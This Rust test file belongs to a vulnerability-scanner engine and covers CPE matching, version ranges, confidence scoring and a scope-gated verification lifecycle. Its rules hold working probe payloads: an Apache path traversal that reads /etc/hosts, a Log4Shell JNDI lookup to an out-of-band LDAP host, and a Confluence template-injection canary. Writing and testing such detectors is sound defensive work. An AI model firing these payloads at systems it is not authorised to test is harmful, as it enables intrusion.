//! SENTINEL V6: Vulnerability Intelligence & Verification-First Engine Tests (Milestone M5 / Section 52)
//!
//! Tests CPE 2.3 parsing, SemVer range evaluation with distro backports,
//! Bayesian target confidence scoring, and 6-stage Verification-First lifecycle.

use std::collections::HashMap;
use chrono::Utc;
use sentinel_common::enums::Severity;
use sentinel_knowledge::confidence::{
    BayesianConfidenceScorer, EvidenceItem, TargetEvaluationDecision,
};
use sentinel_knowledge::cpe::{Cpe23Uri, CpePart, SemVersion};
use sentinel_knowledge::rule_engine::{
    PrerequisiteCheck, RemediationAdvice, RuleVerificationConfig, RuleVerificationType,
    SafeProbeConfig, TechPrerequisite, VulnerabilityRule, VulnerabilityRuleEngine,
};
use sentinel_knowledge::vulnerability::{
    AdvisorySource, CanonicalVulnerabilityAdvisory, CvssV3Data, EpssData,
};

#[test]
fn test_cpe_23_uri_parsing_and_matching() {
    // 1. Valid CPE 2.3 URI
    let uri_str = "cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*";
    let cpe = Cpe23Uri::parse(uri_str).expect("Valid CPE 2.3 URI should parse");
    assert_eq!(cpe.part, CpePart::Application);
    assert_eq!(cpe.vendor, "apache");
    assert_eq!(cpe.product, "http_server");
    assert_eq!(cpe.version, "2.4.49");

    // 2. Matching against target
    assert!(cpe.matches_target("apache", "http_server"));
    assert!(cpe.matches_target("Apache", "HTTP_SERVER"));
    assert!(!cpe.matches_target("nginx", "http_server"));

    // 3. Round-trip formatting
    assert_eq!(cpe.to_cpe23_string(), uri_str);

    // 4. Wildcard matching
    let wildcard_cpe = Cpe23Uri::parse("cpe:2.3:a:*:*:*:*:*:*:*:*:*:*").unwrap();
    assert!(wildcard_cpe.matches_target("any_vendor", "any_product"));
    assert!(wildcard_cpe.matches_cpe(&cpe));

    // 5. Invalid prefix error handling
    let invalid = Cpe23Uri::parse("invalid:cpe:string");
    assert!(invalid.is_err());
}

#[test]
fn test_semver_range_and_distro_backport_patch_resolution() {
    // 1. Standard SemVer parsing & comparison
    let v2_4_49 = SemVersion::parse("2.4.49").expect("Should parse 2.4.49");
    let v2_4_50 = SemVersion::parse("2.4.50").expect("Should parse 2.4.50");
    let v2_5_0 = SemVersion::parse("v2.5.0").expect("Should parse v2.5.0");

    assert!(v2_4_49 < v2_4_50);
    assert!(v2_4_50 < v2_5_0);

    // 2. Range satisfaction checks
    // Check range: >= 2.4.0, < 2.4.50
    assert!(v2_4_49.satisfies_range(Some("2.4.0"), None, Some("2.4.50")));
    assert!(!v2_4_50.satisfies_range(Some("2.4.0"), None, Some("2.4.50")));

    // 3. Linux Distribution Backport Build Comparison
    let distro_vulnerable = SemVersion::parse("2.4.41-4ubuntu3.10").unwrap();
    let distro_patched = SemVersion::parse("2.4.41-4ubuntu3.14").unwrap();

    // 4ubuntu3.14 is patched if fixed version is 4ubuntu3.12
    assert!(distro_patched.is_distro_backport_patched("4ubuntu3.12"));
    assert!(!distro_vulnerable.is_distro_backport_patched("4ubuntu3.12"));
}

#[test]
fn test_bayesian_target_technology_confidence_scoring() {
    // 1. Empty evidence -> 0.0 confidence
    assert_eq!(BayesianConfidenceScorer::calculate_confidence(&[]), 0.0);

    // 2. Single passive header (w = 0.30)
    let header_ev = vec![EvidenceItem::passive_header(
        "Server",
        "Apache/2.4.49 (Ubuntu)",
    )];
    let score1 = BayesianConfidenceScorer::calculate_confidence(&header_ev);
    assert!((score1 - 0.30).abs() < 0.01);

    // 3. Combined evidence: Header (0.30) + DOM (0.50) + MurmurHash3 Favicon (0.85)
    let multi_ev = vec![
        EvidenceItem::passive_header("Server", "Apache/2.4.49"),
        EvidenceItem::dom_signature("generator", "<meta name='generator' content='Apache'>"),
        EvidenceItem::static_asset_hash("favicon", "MurmurHash3: -129384729"),
    ];
    // Formula: 1.0 - (1 - 0.30) * (1 - 0.50) * (1 - 0.85) = 1.0 - (0.7 * 0.5 * 0.15) = 1.0 - 0.0525 = 0.9475
    let score_combined = BayesianConfidenceScorer::calculate_confidence(&multi_ev);
    assert!((score_combined - 0.9475).abs() < 0.001);

    // 4. Threshold & Scope evaluation
    let in_scope = true;
    let decision =
        BayesianConfidenceScorer::evaluate_target_prerequisite(score_combined, 0.85, in_scope);
    assert!(decision.should_proceed());

    // Low confidence check
    let low_decision =
        BayesianConfidenceScorer::evaluate_target_prerequisite(score1, 0.85, in_scope);
    assert!(!low_decision.should_proceed());
    assert!(matches!(
        low_decision,
        TargetEvaluationDecision::SkipLowConfidence { .. }
    ));

    // Out of scope check (SEC-01)
    let out_of_scope_decision =
        BayesianConfidenceScorer::evaluate_target_prerequisite(score_combined, 0.85, false);
    assert!(!out_of_scope_decision.should_proceed());
    assert_eq!(
        out_of_scope_decision,
        TargetEvaluationDecision::SkipOutOfScope
    );
}

#[test]
fn test_adaptive_priority_score_calculation() {
    let advisory_kev = CanonicalVulnerabilityAdvisory {
        id: "CVE-2021-44228".into(),
        source: AdvisorySource::Nvd,
        title: "Log4Shell RCE".into(),
        description: "Remote code execution in Log4j2".into(),
        published_at: Utc::now(),
        updated_at: Utc::now(),
        severity: Severity::Critical,
        cvss_v3: Some(CvssV3Data {
            base_score: 10.0,
            vector_string: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H".into(),
            attack_vector: "NETWORK".into(),
            attack_complexity: "LOW".into(),
            privileges_required: "NONE".into(),
            user_interaction: "NONE".into(),
            scope: "CHANGED".into(),
            confidentiality_impact: "HIGH".into(),
            integrity_impact: "HIGH".into(),
            availability_impact: "HIGH".into(),
        }),
        cvss_v4: None,
        epss: Some(EpssData {
            score: 0.975,
            percentile: 0.999,
        }),
        is_cisa_kev: true,
        kev_due_date: Some("2021-12-24".into()),
        cpe_matches: vec![],
        affected_packages: vec![],
        cwe_ids: vec!["CWE-502".into()],
        references: vec![],
        rule_registry_ref: Some("RULE-CVE-2021-44228".into()),
        remediation_advice: "Upgrade to Log4j >= 2.17.1".into(),
    };

    // Priority = (10.0 * 0.4) + (0.975 * 30) + (1 * 40) + (1.0 * 20) = 4.0 + 29.25 + 40.0 + 20.0 = 93.25
    let priority = advisory_kev.compute_priority_score(1.0);
    assert!((priority - 93.25).abs() < 0.01);
}

#[test]
fn test_verification_first_lifecycle_full_success_and_cas_proof() {
    let mut engine = VulnerabilityRuleEngine::new();

    // Register Apache 2.4.49 Traversal Rule (CVE-2021-41773)
    let rule = VulnerabilityRule {
        id: "RULE-CVE-2021-41773".into(),
        cve_id: "CVE-2021-41773".into(),
        title: "Apache HTTP Server 2.4.49 Path Traversal".into(),
        category: "PATH_TRAVERSAL".into(),
        severity: Severity::Critical,
        cvss_v3_score: 9.8,
        is_cisa_kev: true,
        cpe_matches: vec!["cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*".into()],
        technologies: vec![TechPrerequisite {
            name: "Apache".into(),
            confidence_threshold: 0.85,
        }],
        prerequisites: vec![PrerequisiteCheck {
            check_type: "HEADER_CONTAINS".into(),
            value: Some("Apache/2.4.49".into()),
            port: Some(80),
        }],
        safe_probe: SafeProbeConfig {
            method: "GET".into(),
            path: Some("/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/hosts".into()),
            headers: HashMap::new(),
            body: None,
            non_destructive: true,
        },
        verification: RuleVerificationConfig {
            verification_type: RuleVerificationType::HttpStatusAndBody,
            expected_status: Some(200),
            body_regex: Some("127\\.0\\.0\\.1\\s+localhost".into()),
            exact_pattern: None,
            oast_protocol: None,
            cas_proof_required: true,
        },
        remediation: RemediationAdvice {
            guidance: "Upgrade Apache HTTP Server to >= 2.4.51".into(),
            fixed_version: Some("2.4.51".into()),
        },
    };
    engine.register_rule(rule);

    let high_conf_evidence = vec![
        EvidenceItem::passive_header("Server", "Apache/2.4.49 (Unix)"),
        EvidenceItem::static_asset_hash("favicon", "MurmurHash3: -129384729"),
    ];

    // Case 1: Target In Scope, Tech Confirmed (95%), Response Matches -> Verified Finding with CAS Proof
    let response_body = b"127.0.0.1 localhost\n127.0.1.1 server.local\n";
    let report = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2021-41773",
            "https://target.local",
            true, // in scope
            &high_conf_evidence,
            200,
            response_body,
            false,
        )
        .expect("Lifecycle evaluation should succeed");

    assert!(report.matched_candidate);
    assert!(report.precondition_passed);
    assert!(report.probe_executed);
    assert!(report.verified);
    assert!(report.finding_id.is_some());
    assert!(report.cas_proof_hash.is_some());
    assert_eq!(report.cas_proof_hash.as_ref().unwrap().len(), 64); // SHA-256 hex string

    // Case 2: Negative Control - Probe returns non-vulnerable 404
    let negative_report = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2021-41773",
            "https://target.local",
            true,
            &high_conf_evidence,
            404,
            b"404 Not Found",
            false,
        )
        .unwrap();

    assert!(negative_report.matched_candidate);
    assert!(negative_report.precondition_passed);
    assert!(negative_report.probe_executed);
    assert!(!negative_report.verified); // Not vulnerable!
    assert!(negative_report.finding_id.is_none()); // ZERO finding pollution

    // Case 3: Target Low Confidence (Insufficient evidence) -> Precondition Fails, Probe NOT executed
    let low_conf_evidence = vec![EvidenceItem::passive_header("X-Powered-By", "PHP/8.1")];
    let low_conf_report = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2021-41773",
            "https://target.local",
            true,
            &low_conf_evidence,
            200,
            response_body,
            false,
        )
        .unwrap();

    assert!(low_conf_report.matched_candidate);
    assert!(!low_conf_report.precondition_passed);
    assert!(!low_conf_report.probe_executed); // Skipped early!
    assert!(!low_conf_report.verified);
    assert!(low_conf_report.finding_id.is_none());

    // Case 4: Target Out of Scope (SEC-01) -> Precondition Fails, Probe NOT executed
    let out_of_scope_report = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2021-41773",
            "https://unauthorized-target.com",
            false, // Out of scope
            &high_conf_evidence,
            200,
            response_body,
            false,
        )
        .unwrap();

    assert!(!out_of_scope_report.precondition_passed);
    assert!(!out_of_scope_report.probe_executed);
    assert!(!out_of_scope_report.verified);
}

#[test]
fn test_oast_and_ssti_rule_verifications() {
    let mut engine = VulnerabilityRuleEngine::new();

    // 1. Log4Shell OAST Callback Rule (CVE-2021-44228)
    let log4j_rule = VulnerabilityRule {
        id: "RULE-CVE-2021-44228".into(),
        cve_id: "CVE-2021-44228".into(),
        title: "Log4j2 JNDI RCE".into(),
        category: "RCE".into(),
        severity: Severity::Critical,
        cvss_v3_score: 10.0,
        is_cisa_kev: true,
        cpe_matches: vec!["cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*".into()],
        technologies: vec![TechPrerequisite {
            name: "Java".into(),
            confidence_threshold: 0.60,
        }],
        prerequisites: vec![],
        safe_probe: SafeProbeConfig {
            method: "POST".into(),
            path: Some("/login".into()),
            headers: HashMap::new(),
            body: Some("username=${jndi:ldap://test.oast.internal/a}".into()),
            non_destructive: true,
        },
        verification: RuleVerificationConfig {
            verification_type: RuleVerificationType::OastCallback,
            expected_status: None,
            body_regex: None,
            exact_pattern: None,
            oast_protocol: Some("DNS_AND_LDAP".into()),
            cas_proof_required: true,
        },
        remediation: RemediationAdvice {
            guidance: "Upgrade to Log4j >= 2.17.1".into(),
            fixed_version: Some("2.17.1".into()),
        },
    };
    engine.register_rule(log4j_rule);

    let java_evidence = vec![
        EvidenceItem::dom_signature("stacktrace", "at java.lang.Thread.run"),
        EvidenceItem::passive_header("X-Powered-By", "Servlet/3.1"),
    ];

    // OAST received -> Verified
    let oast_verified = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2021-44228",
            "https://java-app.local",
            true,
            &java_evidence,
            500,
            b"Internal Server Error",
            true, // OAST callback received!
        )
        .unwrap();
    assert!(oast_verified.verified);
    assert!(oast_verified.finding_id.is_some());

    // OAST not received -> Not Verified
    let oast_unverified = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2021-44228",
            "https://java-app.local",
            true,
            &java_evidence,
            500,
            b"Internal Server Error",
            false, // No OAST callback
        )
        .unwrap();
    assert!(!oast_unverified.verified);

    // 2. Confluence SSTI Math Canary Rule (CVE-2023-22527)
    let ssti_rule = VulnerabilityRule {
        id: "RULE-CVE-2023-22527".into(),
        cve_id: "CVE-2023-22527".into(),
        title: "Confluence SSTI".into(),
        category: "SSTI".into(),
        severity: Severity::Critical,
        cvss_v3_score: 10.0,
        is_cisa_kev: true,
        cpe_matches: vec!["cpe:2.3:a:atlassian:confluence_server:*:*:*:*:*:*:*:*".into()],
        technologies: vec![TechPrerequisite {
            name: "Confluence".into(),
            confidence_threshold: 0.80,
        }],
        prerequisites: vec![],
        safe_probe: SafeProbeConfig {
            method: "POST".into(),
            path: Some("/template/custom/stack.action".into()),
            headers: HashMap::new(),
            body: Some("label={{7*777}}".into()),
            non_destructive: true,
        },
        verification: RuleVerificationConfig {
            verification_type: RuleVerificationType::HttpBodyExact,
            expected_status: None,
            body_regex: None,
            exact_pattern: Some("5439".into()),
            oast_protocol: None,
            cas_proof_required: true,
        },
        remediation: RemediationAdvice {
            guidance: "Upgrade Confluence to >= 8.5.4".into(),
            fixed_version: Some("8.5.4".into()),
        },
    };
    engine.register_rule(ssti_rule);

    let conf_evidence = vec![
        EvidenceItem::dom_signature("confluence", "<meta name='confluence-base-url'>"),
        EvidenceItem::static_asset_hash("confluence-logo", "MurmurHash3: 8823719"),
    ];

    // Response contains calculated math product 5439 -> Verified!
    let ssti_verified = engine
        .evaluate_target_lifecycle(
            "RULE-CVE-2023-22527",
            "https://wiki.corp.local",
            true,
            &conf_evidence,
            200,
            b"Result: 5439 in template",
            false,
        )
        .unwrap();
    assert!(ssti_verified.verified);
    assert!(ssti_verified.cas_proof_hash.is_some());
}
